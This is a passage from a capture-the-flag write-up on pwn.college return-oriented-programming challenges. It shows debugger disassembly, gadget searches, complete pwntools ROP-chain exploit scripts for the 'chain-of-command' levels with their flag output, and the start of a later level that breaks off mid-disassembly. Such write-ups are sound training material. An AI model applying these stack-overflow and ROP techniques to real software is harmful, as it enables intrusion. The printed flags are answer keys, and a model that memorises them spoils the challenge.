payload += p64(win_stage_5_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/chain-of-command-easy')
    try:
        p.recvuntil("and 8 that will overwrite the return address).")
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~chain-of-command-easy:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/chain-of-command-easy': pid 10627
/home/hacker/script.py:57: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("and 8 that will overwrite the return address).")
[+] Receiving all data: Done (1.74KB)
[*] Process '/challenge/chain-of-command-easy' stopped with exit code -11 (SIGSEGV) (pid 10627)
[!!!] FLAG FOUND !!!

Received 240 bytes! This is potentially 15 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 16 gadgets of ROP chain at 0x7fff0ad0d978.
| 0x0000000000402ca3: pop rdi ; ret  ; 
| 0x0000000000000001: (UNMAPPED MEMORY)
| 0x00000000004028ba: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 1 ; je 0x4028e9 ; lea rdi, [rip + 0x8b9] ; call 0x401150 ; 
| 0x0000000000402ca3: pop rdi ; ret  ; 
| 0x0000000000000002: (UNMAPPED MEMORY)
| 0x0000000000402615: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 2 ; je 0x402644 ; lea rdi, [rip + 0xb5e] ; call 0x401150 ; 
| 0x0000000000402ca3: pop rdi ; ret  ; 
| 0x0000000000000003: (UNMAPPED MEMORY)
| 0x00000000004026f5: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 3 ; je 0x402724 ; lea rdi, [rip + 0xa7e] ; call 0x401150 ; 
| 0x0000000000402ca3: pop rdi ; ret  ; 
| 0x0000000000000004: (UNMAPPED MEMORY)
| 0x000000000040252f: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 4 ; je 0x40255e ; lea rdi, [rip + 0xc44] ; call 0x401150 ; 
| 0x0000000000402ca3: pop rdi ; ret  ; 
| 0x0000000000000005: (UNMAPPED MEMORY)
| 0x00000000004027d7: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 5 ; je 0x402806 ; lea rdi, [rip + 0x99c] ; call 0x401150 ; 
| 0x0000000000000000: (UNMAPPED MEMORY)

Leaving!
pwn.college{AKuLaEeHPistmjz7_PyUH9Qd5vM.0VN0MDL4ITM0EzW}
```

&nbsp;

## Chain of Command (Hard)

Requirements to craft an exploit:

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [ ] Offset of instruction in `win_stage_1()` within the program
- [ ] Argument expected by `win_stage_1()` 
- [ ] Offset of instruction in `win_stage_2()` within the program
- [ ] Argument expected by `win_stage_2()` 
- [ ] Offset of instruction in `win_stage_3()` within the program
- [ ] Argument expected by `win_stage_3()` 
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Argument expected by `win_stage_4()` 
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010c0  putchar@plt
0x00000000004010d0  puts@plt
0x00000000004010e0  write@plt
0x00000000004010f0  printf@plt
0x0000000000401100  lseek@plt
0x0000000000401110  close@plt
0x0000000000401120  read@plt
0x0000000000401130  setvbuf@plt
0x0000000000401140  open@plt
0x0000000000401150  _start
0x0000000000401180  _dl_relocate_static_pie
0x0000000000401190  deregister_tm_clones
0x00000000004011c0  register_tm_clones
0x0000000000401200  __do_global_dtors_aux
0x0000000000401230  frame_dummy
0x0000000000401236  bin_padding
0x0000000000402079  win_stage_2
0x0000000000402159  win_stage_3
0x000000000040223b  win_stage_1
0x0000000000402317  win_stage_5
0x00000000004023fa  win_stage_4
0x00000000004024e0  challenge
0x000000000040251f  main
0x00000000004025e0  __libc_csu_init
0x0000000000402650  __libc_csu_fini
0x0000000000402658  _fini
```

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000004024e0 <+0>:     endbr64
   0x00000000004024e4 <+4>:     push   rbp
   0x00000000004024e5 <+5>:     mov    rbp,rsp
   0x00000000004024e8 <+8>:     add    rsp,0xffffffffffffff80
   0x00000000004024ec <+12>:    mov    DWORD PTR [rbp-0x64],edi
   0x00000000004024ef <+15>:    mov    QWORD PTR [rbp-0x70],rsi
   0x00000000004024f3 <+19>:    mov    QWORD PTR [rbp-0x78],rdx
   0x00000000004024f7 <+23>:    lea    rax,[rbp-0x60]
   0x00000000004024fb <+27>:    mov    edx,0x1000
   0x0000000000402500 <+32>:    mov    rsi,rax
   0x0000000000402503 <+35>:    mov    edi,0x0
   0x0000000000402508 <+40>:    call   0x401120 <read@plt>
   0x000000000040250d <+45>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000000000402510 <+48>:    lea    rdi,[rip+0xb0b]        # 0x403022
   0x0000000000402517 <+55>:    call   0x4010d0 <puts@plt>
   0x000000000040251c <+60>:    nop
   0x000000000040251d <+61>:    leave
   0x000000000040251e <+62>:    ret
End of assembler dump.
```

A the call to `read@plt` is made at `challenge+40`. Let's set a breakpoint and run the program.

```
pwndbg> break *(challenge+40)
Breakpoint 1 at 0x402508
```

```
pwndbg> run
Starting program: /challenge/chain-of-command-hard 
###
### Welcome to /challenge/chain-of-command-hard!
###


Breakpoint 1, 0x0000000000402508 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffd74326e20 ◂— 0
 RBX  0x4025e0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7ffd74326fa8 —▸ 0x7ffd74327666 ◂— '/challenge/chain-of-command-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7ffd74326e20 ◂— 0
 R8   0
 R9   0x31
 R10  0xfffffffffffff58f
 R11  0x7a3d9e266ce0 (setvbuf) ◂— endbr64 
 R12  0x401150 (_start) ◂— endbr64 
 R13  0x7ffd74326fa0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd74326e80 —▸ 0x7ffd74326eb0 ◂— 0
 RSP  0x7ffd74326e00 —▸ 0x7a3d9e3cb4a0 (_IO_file_jumps) ◂— 0
 RIP  0x402508 (challenge+40) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x402508 <challenge+40>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffd74326e20 ◂— 0
        nbytes: 0x1000
 
   0x40250d <challenge+45>    mov    dword ptr [rbp - 4], eax
   0x402510 <challenge+48>    lea    rdi, [rip + 0xb0b]           RDI => 0x403022 ◂— 'Leaving!'
   0x402517 <challenge+55>    call   puts@plt                    <puts@plt>
 
   0x40251c <challenge+60>    nop    
   0x40251d <challenge+61>    leave  
   0x40251e <challenge+62>    ret    
 
   0x40251f <main>            endbr64 
   0x402523 <main+4>          push   rbp
   0x402524 <main+5>          mov    rbp, rsp
   0x402527 <main+8>          sub    rsp, 0x20
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffd74326e00 —▸ 0x7a3d9e3cb4a0 (_IO_file_jumps) ◂— 0
01:0008│-078     0x7ffd74326e08 —▸ 0x7ffd74326fb8 —▸ 0x7ffd74327687 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-070     0x7ffd74326e10 —▸ 0x7ffd74326fa8 —▸ 0x7ffd74327666 ◂— '/challenge/chain-of-command-hard'
03:0018│-068     0x7ffd74326e18 ◂— 0x19e2745dd
04:0020│ rax rsi 0x7ffd74326e20 ◂— 0
05:0028│-058     0x7ffd74326e28 —▸ 0x7a3d9e3cf6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
06:0030│-050     0x7ffd74326e30 ◂— 0
07:0038│-048     0x7ffd74326e38 ◂— 0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x402508 challenge+40
   1         0x4025c4 main+165
   2   0x7a3d9e206083 __libc_start_main+243
   3         0x40117e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffd74326e20`
- [ ] Location of return address to `main()`
- [ ] Offset of instruction in `win_stage_1()` within the program
- [ ] Argument expected by `win_stage_1()` 
- [ ] Offset of instruction in `win_stage_2()` within the program
- [ ] Argument expected by `win_stage_2()` 
- [ ] Offset of instruction in `win_stage_3()` within the program
- [ ] Argument expected by `win_stage_3()` 
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Argument expected by `win_stage_4()` 
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

```
pwndbg> info frame
Stack level 0, frame at 0x7ffd74326e90:
 rip = 0x402508 in challenge; saved rip = 0x4025c4
 called by frame at 0x7ffd74326ec0
 Arglist at 0x7ffd74326e80, args: 
 Locals at 0x7ffd74326e80, Previous frame's sp is 0x7ffd74326e90
 Saved registers:
  rbp at 0x7ffd74326e80, rip at 0x7ffd74326e88
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [ ] Offset of instruction in `win_stage_1()` within the program
- [ ] Argument expected by `win_stage_1()` 
- [ ] Offset of instruction in `win_stage_2()` within the program
- [ ] Argument expected by `win_stage_2()` 
- [ ] Offset of instruction in `win_stage_3()` within the program
- [ ] Argument expected by `win_stage_3()` 
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Argument expected by `win_stage_4()` 
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

Now, let's get the offsets of such instructions within the `win_stage_*()` functions that we skip the argument checks.

#### `win_stage_1()`

```
pwndbg> disassemble win_stage_1
Dump of assembler code for function win_stage_1:
   0x000000000040223b <+0>:     endbr64
   0x000000000040223f <+4>:     push   rbp
   0x0000000000402240 <+5>:     mov    rbp,rsp
   0x0000000000402243 <+8>:     sub    rsp,0x120
   0x000000000040224a <+15>:    mov    DWORD PTR [rbp-0x114],edi
   0x0000000000402250 <+21>:    cmp    DWORD PTR [rbp-0x114],0x1
   0x0000000000402257 <+28>:    je     0x40226a <win_stage_1+47>
   0x0000000000402259 <+30>:    lea    rdi,[rip+0xda4]        # 0x403004
   0x0000000000402260 <+37>:    call   0x4010d0 <puts@plt>
   0x0000000000402265 <+42>:    jmp    0x402315 <win_stage_1+218>
   0x000000000040226a <+47>:    mov    esi,0x0
   
# ---- snip ----

   0x0000000000402315 <+218>:   leave
   0x0000000000402316 <+219>:   ret
End of assembler dump.
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
- [x] Argument expected by `win_stage_1()`: `0x1` 
- [ ] Offset of instruction in `win_stage_2()` within the program
- [ ] Argument expected by `win_stage_2()` 
- [ ] Offset of instruction in `win_stage_3()` within the program
- [ ] Argument expected by `win_stage_3()` 
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Argument expected by `win_stage_4()` 
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

#### `win_stage_2()`

```
pwndbg> disassemble win_stage_2
Dump of assembler code for function win_stage_2:
   0x0000000000402079 <+0>:     endbr64
   0x000000000040207d <+4>:     push   rbp
   0x000000000040207e <+5>:     mov    rbp,rsp
   0x0000000000402081 <+8>:     sub    rsp,0x120
   0x0000000000402088 <+15>:    mov    DWORD PTR [rbp-0x114],edi
   0x000000000040208e <+21>:    cmp    DWORD PTR [rbp-0x114],0x2
   0x0000000000402095 <+28>:    je     0x4020a8 <win_stage_2+47>
   0x0000000000402097 <+30>:    lea    rdi,[rip+0xf66]        # 0x403004
   0x000000000040209e <+37>:    call   0x4010d0 <puts@plt>
   0x00000000004020a3 <+42>:    jmp    0x402157 <win_stage_2+222>
   0x00000000004020a8 <+47>:    mov    esi,0x0

# ---- snip ----

   0x0000000000402157 <+222>:   leave
   0x0000000000402158 <+223>:   ret
End of assembler dump.
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
- [x] Argument expected by `win_stage_1()`: `0x1` 
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079`
- [x] Argument expected by `win_stage_2()`: `0x2`
- [ ] Offset of instruction in `win_stage_3()` within the program
- [ ] Argument expected by `win_stage_3()` 
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Argument expected by `win_stage_4()` 
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

#### `win_stage_3()`

```
pwndbg> disassemble win_stage_3
Dump of assembler code for function win_stage_3:
   0x0000000000402159 <+0>:     endbr64
   0x000000000040215d <+4>:     push   rbp
   0x000000000040215e <+5>:     mov    rbp,rsp
   0x0000000000402161 <+8>:     sub    rsp,0x120
   0x0000000000402168 <+15>:    mov    DWORD PTR [rbp-0x114],edi
   0x000000000040216e <+21>:    cmp    DWORD PTR [rbp-0x114],0x3
   0x0000000000402175 <+28>:    je     0x402188 <win_stage_3+47>
   0x0000000000402177 <+30>:    lea    rdi,[rip+0xe86]        # 0x403004
   0x000000000040217e <+37>:    call   0x4010d0 <puts@plt>
   0x0000000000402183 <+42>:    jmp    0x402239 <win_stage_3+224>
   0x0000000000402188 <+47>:    mov    esi,0x0

# ---- snip ----

   0x0000000000402239 <+224>:   leave
   0x000000000040223a <+225>:   ret
End of assembler dump.
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
- [x] Argument expected by `win_stage_1()`: `0x1`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079`
- [x] Argument expected by `win_stage_2()`: `0x2`
- [x] Offset of instruction in `win_stage_3()` within the program: `0x402159`
- [x] Argument expected by `win_stage_3()`: `0x3` 
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Argument expected by `win_stage_4()` 
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

#### `win_stage_4()`

```
pwndbg> disassemble win_stage_4
Dump of assembler code for function win_stage_4:
   0x00000000004023fa <+0>:     endbr64
   0x00000000004023fe <+4>:     push   rbp
   0x00000000004023ff <+5>:     mov    rbp,rsp
   0x0000000000402402 <+8>:     sub    rsp,0x120
   0x0000000000402409 <+15>:    mov    DWORD PTR [rbp-0x114],edi
   0x000000000040240f <+21>:    cmp    DWORD PTR [rbp-0x114],0x4
   0x0000000000402416 <+28>:    je     0x402429 <win_stage_4+47>
   0x0000000000402418 <+30>:    lea    rdi,[rip+0xbe5]        # 0x403004
   0x000000000040241f <+37>:    call   0x4010d0 <puts@plt>
   0x0000000000402424 <+42>:    jmp    0x4024de <win_stage_4+228>
   0x0000000000402429 <+47>:    mov    esi,0x0

# ---- snip ----

   0x00000000004024de <+228>:   leave
   0x00000000004024df <+229>:   ret
End of assembler dump.
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
- [x] Argument expected by `win_stage_1()`: `0x1`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079`
- [x] Argument expected by `win_stage_2()`: `0x2`
- [x] Offset of instruction in `win_stage_3()` within the program: `0x402159`
- [x] Argument expected by `win_stage_3()`: `0x3` 
- [x] Offset of instruction in `win_stage_4()` within the program: `0x4023fa`
- [x] Argument expected by `win_stage_4()`: `0x4`
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Argument expected by `win_stage_5()` 
- [ ] Offset of `pop rdi ; ret` gadget within the program

#### `win_stage_5()`

```
pwndbg> disassemble win_stage_5
Dump of assembler code for function win_stage_5:
   0x0000000000402317 <+0>:     endbr64
   0x000000000040231b <+4>:     push   rbp
   0x000000000040231c <+5>:     mov    rbp,rsp
   0x000000000040231f <+8>:     sub    rsp,0x120
   0x0000000000402326 <+15>:    mov    DWORD PTR [rbp-0x114],edi
   0x000000000040232c <+21>:    cmp    DWORD PTR [rbp-0x114],0x5
   0x0000000000402333 <+28>:    je     0x402346 <win_stage_5+47>
   0x0000000000402335 <+30>:    lea    rdi,[rip+0xcc8]        # 0x403004
   0x000000000040233c <+37>:    call   0x4010d0 <puts@plt>
   0x0000000000402341 <+42>:    jmp    0x4023f8 <win_stage_5+225>
   0x0000000000402346 <+47>:    mov    esi,0x0

# ---- snip ----

   0x00000000004023f8 <+225>:   leave
   0x00000000004023f9 <+226>:   ret
End of assembler dump.
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
- [x] Argument expected by `win_stage_1()`: `0x1`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079` 
- [x] Argument expected by `win_stage_2()`: `0x2`
- [x] Offset of instruction in `win_stage_3()` within the program: `0x402159`
- [x] Argument expected by `win_stage_3()`: `0x3` 
- [x] Offset of instruction in `win_stage_4()` within the program: `0x4023fa`
- [x] Argument expected by `win_stage_4()`: `0x4`
- [x] Offset of instruction in `win_stage_5()` within the program: `0x402317`
- [x] Argument expected by `win_stage_5()`: `0x5`
- [ ] Offset of `pop rdi ; ret` gadget within the program

#### `pop rdi ; ret` gadget

Now let's find the address of the `pop rdi ; ret` gadget.

```
hacker@return-oriented-programming~chain-of-command-hard:/$ ROPgadget --binary /challenge/chain-of-command-hard | grep "pop rdi ; ret"
0x0000000000402643 : pop rdi ; ret
```

- [x] Location of buffer: `0x7ffd74326e20`
- [x] Location of return address to `main()`: `0x7ffd74326e88`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
- [x] Argument expected by `win_stage_1()`: `0x1`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079` 
- [x] Argument expected by `win_stage_2()`: `0x2`
- [x] Offset of instruction in `win_stage_3()` within the program: `0x402159`
- [x] Argument expected by `win_stage_3()`: `0x3` 
- [x] Offset of instruction in `win_stage_4()` within the program: `0x4023fa`
- [x] Argument expected by `win_stage_4()`: `0x4`
- [x] Offset of instruction in `win_stage_5()` within the program: `0x402317`
- [x] Argument expected by `win_stage_5()`: `0x5`
- [x] Offset of `pop rdi ; ret` gadget within the program: `0x402643`

### ROP chain

The ROP chain in this challenge, will be the same as the [last level](#rop-chain), only with different addresses.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_stage_1_offset = 0x40223b
win_stage_1_arg = 1
win_stage_2_offset = 0x402079
win_stage_2_arg = 2
win_stage_3_offset = 0x402159
win_stage_3_arg = 3
win_stage_4_offset = 0x4023fa
win_stage_4_arg = 4
win_stage_5_offset = 0x402317
win_stage_5_arg = 5

buffer_addr = 0x7ffd74326e20
addr_of_saved_ip = 0x7ffd74326e88

# Calculate offset
offset = addr_of_saved_ip - buffer_addr

# Gadget address found
pop_rdi_ret = 0x402643

# Base offset to reach the return address
payload = b"A" * offset

# Stage 1: win_stage_1(1)
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(win_stage_1_offset)

# Stage 2: win_stage_2(2)
payload += p64(pop_rdi_ret)
payload += p64(2)
payload += p64(win_stage_2_offset)

# Stage 3: win_stage_3(3)
payload += p64(pop_rdi_ret)
payload += p64(3)
payload += p64(win_stage_3_offset)

# Stage 4: win_stage_4(4)
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(win_stage_4_offset)

# Stage 5: win_stage_5(5)
payload += p64(pop_rdi_ret)
payload += p64(5)
payload += p64(win_stage_5_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/chain-of-command-hard')
    try:
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~chain-of-command-hard:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/chain-of-command-hard': pid 13432
[+] Receiving all data: Done (124B)
[*] Process '/challenge/chain-of-command-hard' stopped with exit code -11 (SIGSEGV) (pid 13432)
[!!!] FLAG FOUND !!!
###
### Welcome to /challenge/chain-of-command-hard!
###

Leaving!
pwn.college{EUjrXInTnvQAkZEX53BXXgHbktj.0lN0MDL4ITM0EzW}
```

&nbsp;

## Stop, Pop and ROP (Easy)

```
hacker@return-oriented-programming~stop-pop-and-rop-easy:~$ /challenge/stop-pop-and-rop-easy 
###
### Welcome to /challenge/stop-pop-and-rop-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

ASLR means that the address of the stack is not known,
but I will simulate a memory disclosure of it.
By knowing where the stack is, you can now reference data
that you write onto the stack.
Be careful: this data could trip up your ROP chain,
because it could be interpreted as return addresses.
You can use gadgets that shift the stack appropriately to avoid that.
[LEAK] Your input buffer is located at: 0x7ffc3ab87820.
```

So the challenge gives is the location of the buffer. Let's obtain the offset.

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010f0  putchar@plt
0x0000000000401100  __errno_location@plt
0x0000000000401110  puts@plt
0x0000000000401120  cs_free@plt
0x0000000000401130  printf@plt
0x0000000000401140  read@plt
0x0000000000401150  strcmp@plt
0x0000000000401160  cs_disasm@plt
0x0000000000401170  mincore@plt
0x0000000000401180  setvbuf@plt
0x0000000000401190  cs_open@plt
0x00000000004011a0  cs_close@plt
0x00000000004011b0  _start
0x00000000004011e0  _dl_relocate_static_pie
0x00000000004011f0  deregister_tm_clones
0x0000000000401220  register_tm_clones
0x0000000000401260  __do_global_dtors_aux
0x0000000000401290  frame_dummy
0x0000000000401296  DUMP_STACK
0x0000000000401499  print_gadget
0x000000000040168d  print_chain
0x00000000004016fb  bin_padding
0x0000000000401e1a  free_gadgets
0x0000000000401e65  challenge
0x000000000040200a  main
0x00000000004020d0  __libc_csu_init
0x0000000000402140  __libc_csu_fini
0x0000000000402148  _fini
```

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000401e65 <+0>:     endbr64
   0x0000000000401e69 <+4>:     push   rbp
   0x0000000000401e6a <+5>:     mov    rbp,rsp
   0x0000000000401e6d <+8>:     sub    rsp,0xb0
   0x0000000000401e74 <+15>:    mov    DWORD PTR [rbp-0x94],edi
   0x0000000000401e7a <+21>:    mov    QWORD PTR [rbp-0xa0],rsi
   0x0000000000401e81 <+28>:    mov    QWORD PTR [rbp-0xa8],rdx
   0x0000000000401e88 <+35>:    lea    rdi,[rip+0x1309]        # 0x403198
   0x0000000000401e8f <+42>:    call   0x401110 <puts@plt>
   0x0000000000401e94 <+47>:    lea    rdi,[rip+0x1375]        # 0x403210
   0x0000000000401e9b <+54>:    call   0x401110 <puts@plt>
   0x0000000000401ea0 <+59>:    mov    rax,rsp
   0x0000000000401ea3 <+62>:    mov    QWORD PTR [rip+0x3236],rax        # 0x4050e0 <sp_>
   0x0000000000401eaa <+69>:    mov    rax,rbp
   0x0000000000401ead <+72>:    mov    QWORD PTR [rip+0x320c],rax        # 0x4050c0 <bp_>
   0x0000000000401eb4 <+79>:    mov    rdx,QWORD PTR [rip+0x3205]        # 0x4050c0 <bp_>
   0x0000000000401ebb <+86>:    mov    rax,QWORD PTR [rip+0x321e]        # 0x4050e0 <sp_>
   0x0000000000401ec2 <+93>:    sub    rdx,rax
   0x0000000000401ec5 <+96>:    mov    rax,rdx
   0x0000000000401ec8 <+99>:    shr    rax,0x3
   0x0000000000401ecc <+103>:   add    rax,0x2
   0x0000000000401ed0 <+107>:   mov    QWORD PTR [rip+0x31f9],rax        # 0x4050d0 <sz_>
   0x0000000000401ed7 <+114>:   mov    rax,QWORD PTR [rip+0x31e2]        # 0x4050c0 <bp_>
   0x0000000000401ede <+121>:   add    rax,0x8
   0x0000000000401ee2 <+125>:   mov    QWORD PTR [rip+0x31ef],rax        # 0x4050d8 <rp_>
   0x0000000000401ee9 <+132>:   lea    rdi,[rip+0x1388]        # 0x403278
   0x0000000000401ef0 <+139>:   call   0x401110 <puts@plt>
   0x0000000000401ef5 <+144>:   lea    rdi,[rip+0x13b4]        # 0x4032b0
   0x0000000000401efc <+151>:   call   0x401110 <puts@plt>
   0x0000000000401f01 <+156>:   lea    rdi,[rip+0x13d8]        # 0x4032e0
   0x0000000000401f08 <+163>:   call   0x401110 <puts@plt>
   0x0000000000401f0d <+168>:   lea    rdi,[rip+0x140c]        # 0x403320
   0x0000000000401f14 <+175>:   call   0x401110 <puts@plt>
   0x0000000000401f19 <+180>:   lea    rdi,[rip+0x1420]        # 0x403340
   0x0000000000401f20 <+187>:   call   0x401110 <puts@plt>
   0x0000000000401f25 <+192>:   lea    rdi,[rip+0x144c]        # 0x403378
   0x0000000000401f2c <+199>:   call   0x401110 <puts@plt>
   0x0000000000401f31 <+204>:   lea    rdi,[rip+0x1478]        # 0x4033b0
   0x0000000000401f38 <+211>:   call   0x401110 <puts@plt>
   0x0000000000401f3d <+216>:   lea    rax,[rbp-0x90]
   0x0000000000401f44 <+223>:   mov    rsi,rax
   0x0000000000401f47 <+226>:   lea    rdi,[rip+0x14aa]        # 0x4033f8
   0x0000000000401f4e <+233>:   mov    eax,0x0
   0x0000000000401f53 <+238>:   call   0x401130 <printf@plt>
   0x0000000000401f58 <+243>:   lea    rax,[rbp-0x90]
   0x0000000000401f5f <+250>:   mov    edx,0x1000
   0x0000000000401f64 <+255>:   mov    rsi,rax
   0x0000000000401f67 <+258>:   mov    edi,0x0
   0x0000000000401f6c <+263>:   call   0x401140 <read@plt>
   0x0000000000401f71 <+268>:   mov    DWORD PTR [rbp-0x4],eax
   0x0000000000401f74 <+271>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401f77 <+274>:   cdqe
   0x0000000000401f79 <+276>:   lea    rcx,[rbp-0x90]
   0x0000000000401f80 <+283>:   mov    rdx,QWORD PTR [rip+0x3151]        # 0x4050d8 <rp_>
   0x0000000000401f87 <+290>:   sub    rcx,rdx
   0x0000000000401f8a <+293>:   mov    rdx,rcx
   0x0000000000401f8d <+296>:   add    rax,rdx
   0x0000000000401f90 <+299>:   shr    rax,0x3
   0x0000000000401f94 <+303>:   mov    rdx,rax
   0x0000000000401f97 <+306>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401f9a <+309>:   mov    esi,eax
   0x0000000000401f9c <+311>:   lea    rdi,[rip+0x1485]        # 0x403428
   0x0000000000401fa3 <+318>:   mov    eax,0x0
   0x0000000000401fa8 <+323>:   call   0x401130 <printf@plt>
   0x0000000000401fad <+328>:   lea    rdi,[rip+0x14ac]        # 0x403460
   0x0000000000401fb4 <+335>:   call   0x401110 <puts@plt>
   0x0000000000401fb9 <+340>:   lea    rdi,[rip+0x1508]        # 0x4034c8
   0x0000000000401fc0 <+347>:   call   0x401110 <puts@plt>
   0x0000000000401fc5 <+352>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401fc8 <+355>:   cdqe
   0x0000000000401fca <+357>:   lea    rcx,[rbp-0x90]
   0x0000000000401fd1 <+364>:   mov    rdx,QWORD PTR [rip+0x3100]        # 0x4050d8 <rp_>
   0x0000000000401fd8 <+371>:   sub    rcx,rdx
   0x0000000000401fdb <+374>:   mov    rdx,rcx
   0x0000000000401fde <+377>:   add    rax,rdx
   0x0000000000401fe1 <+380>:   shr    rax,0x3
   0x0000000000401fe5 <+384>:   add    eax,0x1
   0x0000000000401fe8 <+387>:   mov    edx,eax
   0x0000000000401fea <+389>:   mov    rax,QWORD PTR [rip+0x30e7]        # 0x4050d8 <rp_>
   0x0000000000401ff1 <+396>:   mov    esi,edx
   0x0000000000401ff3 <+398>:   mov    rdi,rax
   0x0000000000401ff6 <+401>:   call   0x40168d <print_chain>
   0x0000000000401ffb <+406>:   lea    rdi,[rip+0x1508]        # 0x40350a
   0x0000000000402002 <+413>:   call   0x401110 <puts@plt>
